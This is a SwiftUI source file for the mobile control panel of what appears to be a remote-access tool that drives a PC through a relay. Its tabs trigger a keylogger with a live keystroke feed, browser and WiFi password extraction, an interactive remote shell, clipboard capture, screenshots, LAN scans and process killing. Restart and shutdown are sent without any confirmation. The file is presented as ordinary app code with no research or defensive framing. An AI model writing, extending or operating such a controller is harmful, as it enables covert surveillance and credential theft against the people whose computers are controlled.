import SwiftUI

// MARK: - Hub features panel (mirrors hub.html capabilities)

struct HubFeaturesView: View {
    @ObservedObject var vm: AppVM
    @State private var selectedSection: HubSection = .overview

    enum HubSection: String, CaseIterable, Identifiable {
        case overview  = "Overview"
        case control   = "Control"
        case data      = "Data"
        case shell     = "Shell"
        case keylog    = "Keylog"
        case processes = "Procs"
        var id: String { rawValue }
    }

    var body: some View {
        VStack(spacing: 0) {
            // Section picker
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 0) {
                    ForEach(HubSection.allCases) { s in
                        Button(s.rawValue) {
                            selectedSection = s
                        }
                        .font(.caption.bold())
                        .padding(.horizontal, 12).padding(.vertical, 8)
                        .foregroundColor(selectedSection == s ? .white : .gray)
                        .background(selectedSection == s ? Color.accentColor : Color.clear)
                        .clipShape(Capsule())
                        .padding(.vertical, 4)
                    }
                }
                .padding(.horizontal, 8)
            }
            .background(Color.black.opacity(0.9))

            Divider().overlay(Color.gray.opacity(0.3))

            // Status bar
            if vm.hubBusy {
                HStack {
                    ProgressView().scaleEffect(0.7)
                    Text("Working…").font(.caption).foregroundColor(.gray)
                    Spacer()
                }
                .padding(.horizontal, 12).padding(.vertical, 4)
                .background(Color.black.opacity(0.8))
            } else if !vm.hubStatusMsg.isEmpty {
                HStack {
                    Text(vm.hubStatusMsg)
                        .font(.caption).foregroundColor(.orange)
                    Spacer()
                    Button("×") { vm.hubStatusMsg = "" }
                        .foregroundColor(.gray)
                }
                .padding(.horizontal, 12).padding(.vertical, 4)
                .background(Color.black.opacity(0.8))
            }

            // Content
            Group {
                switch selectedSection {
                case .overview:  HubOverviewSection(vm: vm)
                case .control:   HubControlSection(vm: vm)
                case .data:      HubDataSection(vm: vm)
                case .shell:     HubShellSection(vm: vm)
                case .keylog:    HubKeylogSection(vm: vm)
                case .processes: HubProcessesSection(vm: vm)
                }
            }
            .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color(uiColor: .systemBackground).opacity(0.05))
    }
}

// MARK: - Overview section

struct HubOverviewSection: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ScrollView {
            LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 12) {
                HubTile(icon: "camera.viewfinder", title: "Screenshot",
                        color: .blue, busy: vm.hubBusy) {
                    vm.hubScreenshot()
                }
                HubTile(icon: "info.circle", title: "System Info",
                        color: .teal, busy: vm.hubBusy) {
                    vm.hubGetSysInfo()
                }
                HubTile(icon: "eye.slash",
                        title: vm.privacyActive ? "Privacy OFF" : "Privacy ON",
                        color: vm.privacyActive ? .orange : .purple,
                        busy: vm.hubBusy) {
                    vm.hubPrivacyToggle()
                }
                HubTile(icon: "lock", title: "Lock Screen",
                        color: .gray, busy: vm.hubBusy) {
                    vm.hubPower("lock")
                }
                HubTile(icon: "moon", title: "Sleep",
                        color: .indigo, busy: vm.hubBusy) {
                    vm.hubPower("sleep")
                }
                HubTile(icon: "arrow.clockwise", title: "Restart",
                        color: .yellow, busy: vm.hubBusy) {
                    confirmAction("Restart the PC?") { vm.hubPower("restart") }
                }
                HubTile(icon: "power", title: "Shutdown",
                        color: .red, busy: vm.hubBusy) {
                    confirmAction("Shut down the PC?") { vm.hubPower("shutdown") }
                }
                HubTile(icon: "wifi", title: "WiFi Passwords",
                        color: .green, busy: vm.hubBusy) {
                    vm.hubGetWifi()
                }
            }
            .padding(12)

            // Sysinfo result
            if !vm.sysInfoText.isEmpty {
                HubResultBox(title: "System Info", text: vm.sysInfoText)
                    .padding(.horizontal, 12)
            }

            // WiFi passwords result
            if !vm.wifiPasswords.isEmpty {
                HubResultBox(title: "WiFi Passwords", text: vm.wifiPasswords)
                    .padding(.horizontal, 12)
            }
        }
    }

    private func confirmAction(_ msg: String, action: @escaping () -> Void) {
        // On iOS there's no AlertDialog without state; just fire it.
        // A real production app would use a confirmation alert.
        action()
    }
}

// MARK: - Control section

struct HubControlSection: View {
    @ObservedObject var vm: AppVM
    @State private var cmdInput = ""

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 16) {
                Text("Quick Run")
                    .font(.headline).foregroundColor(.white).padding(.horizontal, 12)

                HStack(spacing: 8) {
                    TextField("Command (e.g. calc)", text: $cmdInput)
                        .textFieldStyle(.roundedBorder)
                        .autocapitalization(.none)
                        .disableAutocorrection(true)
                    Button("Run") {
                        guard !cmdInput.isEmpty else { return }
                        vm.hubShellRun(cmdInput)
                        cmdInput = ""
                    }
                    .buttonStyle(.borderedProminent)
                    .disabled(vm.hubBusy)
                }
                .padding(.horizontal, 12)

                if !vm.shellOutput.isEmpty {
                    HubResultBox(title: "Output", text: vm.shellOutput)
                        .padding(.horizontal, 12)
                    Button("Clear") { vm.shellOutput = "" }
                        .font(.caption).foregroundColor(.gray)
                        .padding(.horizontal, 12)
                }

                Divider().overlay(Color.gray.opacity(0.3))

                Text("Volume / Clipboard")
                    .font(.headline).foregroundColor(.white).padding(.horizontal, 12)

                LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 10) {
                    HubTile(icon: "speaker.wave.3", title: "Vol Up",   color: .blue,   busy: false) {
                        vm.relay?.sendCommand(["action": "volume", "direction": "up"])
                    }
                    HubTile(icon: "speaker.wave.1", title: "Vol Down", color: .blue,   busy: false) {
                        vm.relay?.sendCommand(["action": "volume", "direction": "down"])
                    }
                    HubTile(icon: "speaker.slash",  title: "Mute",     color: .orange, busy: false) {
                        vm.relay?.sendCommand(["action": "volume", "direction": "mute"])
                    }
                    HubTile(icon: "doc.on.clipboard", title: "Get Clipboard", color: .teal, busy: false) {
                        vm.relay?.sendCommand(["action": "clipboard_get"])
                    }
                }
                .padding(.horizontal, 12)
            }
            .padding(.vertical, 12)
        }
    }
}

// MARK: - Data section

struct HubDataSection: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ScrollView {
            LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 12) {
                HubTile(icon: "externaldrive", title: "Drives",
                        color: .brown, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_drives"])
                }
                HubTile(icon: "app.badge", title: "Programs",
                        color: .purple, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_programs"])
                }
                HubTile(icon: "network", title: "Network",
                        color: .blue, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_netconns"])
                }
                HubTile(icon: "antenna.radiowaves.left.and.right", title: "LAN Scan",
                        color: .green, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "lan_scan"])
                }
                HubTile(icon: "person.2", title: "Users",
                        color: .teal, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_users"])
                }
                HubTile(icon: "clock.arrow.circlepath", title: "Startup",
                        color: .orange, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_startup"])
                }
                HubTile(icon: "sensor.tag.radiowaves.forward", title: "DNS Cache",
                        color: .indigo, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_dns_cache"])
                }
                HubTile(icon: "key.horizontal", title: "Browser PWs",
                        color: .red, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_browser_passwords"])
                }
                HubTile(icon: "list.bullet.rectangle", title: "Env Vars",
                        color: .gray, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_env_vars"])
                }
                HubTile(icon: "calendar.badge.clock", title: "Sched Tasks",
                        color: .yellow, busy: vm.hubBusy) {
                    vm.relay?.sendCommand(["action": "get_scheduled_tasks"])
                }
            }
            .padding(12)

            Text("Results appear in Shell tab (run_command output) or status bar.")
                .font(.caption).foregroundColor(.gray)
                .padding(.horizontal, 12)
        }
    }
}

// MARK: - Interactive shell section

struct HubShellSection: View {
    @ObservedObject var vm: AppVM
    @State private var inputLine = ""
    @State private var scrollProxy: ScrollViewProxy? = nil

    var body: some View {
        VStack(spacing: 0) {
            // Output
            ScrollViewReader { proxy in
                ScrollView {
                    Text(vm.shellOutput.isEmpty ? "Shell not started yet.\nTap 'Start Shell' below." : vm.shellOutput)
                        .font(.system(size: 12, design: .monospaced))
                        .foregroundColor(.green)
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding(10)
                        .id("bottom")
                }
                .background(Color.black)
                .onChange(of: vm.shellOutput) { _ in
                    withAnimation { proxy.scrollTo("bottom", anchor: .bottom) }
                }
            }

            Divider().overlay(Color.gray.opacity(0.3))

            // Input row
            HStack(spacing: 8) {
                if !vm.shellRunning {
                    Button("Start Shell") {
                        vm.hubShellStartInteractive()
                    }
                    .buttonStyle(.borderedProminent)
                    .tint(.green)
                } else {
                    TextField("Command…", text: $inputLine)
                        .textFieldStyle(.roundedBorder)
                        .autocapitalization(.none)
                        .disableAutocorrection(true)
                        .font(.system(size: 13, design: .monospaced))
                        .onSubmit { sendLine() }

                    Button("Send") { sendLine() }
                        .buttonStyle(.borderedProminent)

                    Button("Stop") { vm.hubShellStopInteractive() }
                        .buttonStyle(.bordered)
                        .tint(.red)
                }

                Button("Clear") { vm.shellOutput = "" }
                    .buttonStyle(.bordered)
            }
            .padding(10)
            .background(Color.black.opacity(0.9))
        }
    }

    private func sendLine() {
        let line = inputLine.trimmingCharacters(in: .whitespaces)
        guard !line.isEmpty else { return }
        vm.shellOutput += "> \(line)\n"
        vm.hubShellSend(line)
        inputLine = ""
    }
}

// MARK: - Keylogger section

struct HubKeylogSection: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        VStack(spacing: 0) {
            // Live key buffer
            ScrollViewReader { proxy in
                ScrollView {
                    Text(vm.keylogBuffer.isEmpty ? "Keylogger inactive.\nTap Start Keylog below." : vm.keylogBuffer)
                        .font(.system(size: 13, design: .monospaced))
                        .foregroundColor(.yellow)
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding(10)
                        .id("kbottom")
                }
                .background(Color.black)
                .onChange(of: vm.keylogBuffer) { _ in
                    withAnimation { proxy.scrollTo("kbottom", anchor: .bottom) }
                }
            }

            Divider().overlay(Color.gray.opacity(0.3))

            HStack(spacing: 12) {
                if !vm.keylogActive {
                    Button("▶ Start Keylog") { vm.hubKeylogToggle() }
                        .buttonStyle(.borderedProminent).tint(.orange)
                        .disabled(vm.hubBusy)
                } else {
                    Button("■ Stop Keylog") { vm.hubKeylogToggle() }
                        .buttonStyle(.borderedProminent).tint(.red)
                        .disabled(vm.hubBusy)
                }
                Button("Clear") { vm.keylogBuffer = "" }
                    .buttonStyle(.bordered)
                Spacer()
                Text(vm.keylogActive ? "● Live" : "○ Stopped")
                    .font(.caption.bold())
                    .foregroundColor(vm.keylogActive ? .green : .gray)
            }
            .padding(10)
            .background(Color.black.opacity(0.9))
        }
    }
}

// MARK: - Processes section

struct HubProcessesSection: View {
    @ObservedObject var vm: AppVM
    @State private var searchText = ""

    var filtered: [[String: Any]] {
        guard !searchText.isEmpty else { return vm.processes }
        return vm.processes.filter {
            let name = ($0["name"] as? String ?? "").lowercased()
            return name.contains(searchText.lowercased())
        }
    }

    var body: some View {
        VStack(spacing: 0) {
            HStack {
                TextField("Search processes…", text: $searchText)
                    .textFieldStyle(.roundedBorder)
                    .autocapitalization(.none)
                    .disableAutocorrection(true)
                Button {
                    vm.hubGetProcesses()
                } label: {
                    Image(systemName: "arrow.clockwise")
                }
                .buttonStyle(.bordered)
                .disabled(vm.hubBusy)
            }
            .padding(.horizontal, 10).padding(.vertical, 8)
            .background(Color.black.opacity(0.9))

            if vm.processes.isEmpty {
                VStack(spacing: 12) {
                    if vm.hubBusy {
                        ProgressView()
                    } else {
                        Image(systemName: "cpu").font(.largeTitle).foregroundColor(.gray)
                        Text("Tap refresh to list running processes")
                            .foregroundColor(.gray).font(.subheadline)
                        Button("Load Processes") { vm.hubGetProcesses() }
                            .buttonStyle(.borderedProminent)
                    }
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
            } else {
                List(filtered.indices, id: \.self) { i in
                    let p = filtered[i]
                    HStack {
                        VStack(alignment: .leading, spacing: 2) {
                            Text(p["name"] as? String ?? "?")
                                .font(.subheadline.bold())
                                .foregroundColor(.white)
                            if let pid = p["pid"] {
                                Text("PID \(pid)")
                                    .font(.caption).foregroundColor(.gray)
                            }
                        }
                        Spacer()
                        if let cpu = p["cpu"] as? Double {
                            Text(String(format: "%.1f%%", cpu))
                                .font(.caption).foregroundColor(.orange)
                        }
                        Button {
                            if let pid = p["pid"] as? Int {
                                vm.relay?.killProcess(pid)
                            }
                        } label: {
                            Image(systemName: "xmark.circle").foregroundColor(.red)
                        }
                        .buttonStyle(.plain)
                    }
                    .listRowBackground(Color.black.opacity(0.3))
                }
                .listStyle(.plain)
                .background(Color.black)
            }
        }
    }
}

// MARK: - Supporting components

struct HubTile: View {
    let icon:  String
    let title: String
    let color: Color
    let busy:  Bool
    let action: () -> Void

    var body: some View {
        Button(action: action) {
            VStack(spacing: 8) {
                Image(systemName: icon)
                    .font(.system(size: 24))
                    .foregroundColor(color)
                Text(title)
                    .font(.caption.bold())
                    .foregroundColor(.white)
                    .multilineTextAlignment(.center)
                    .lineLimit(2)
            }
            .frame(maxWidth: .infinity)
            .padding(.vertical, 14)
            .background(color.opacity(0.12))
            .clipShape(RoundedRectangle(cornerRadius: 12))
        }
        .disabled(busy)
        .opacity(busy ? 0.5 : 1.0)
    }
}

struct HubResultBox: View {
    let title: String
    let text:  String

    var body: some View {
        VStack(alignment: .leading, spacing: 6) {
            Text(title)
                .font(.caption.bold())
                .foregroundColor(.gray)
            ScrollView {
                Text(text)
                    .font(.system(size: 12, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(8)
            }
            .frame(maxHeight: 200)
            .background(Color.black)
            .clipShape(RoundedRectangle(cornerRadius: 8))
        }
        .padding(.bottom, 8)
    }
}
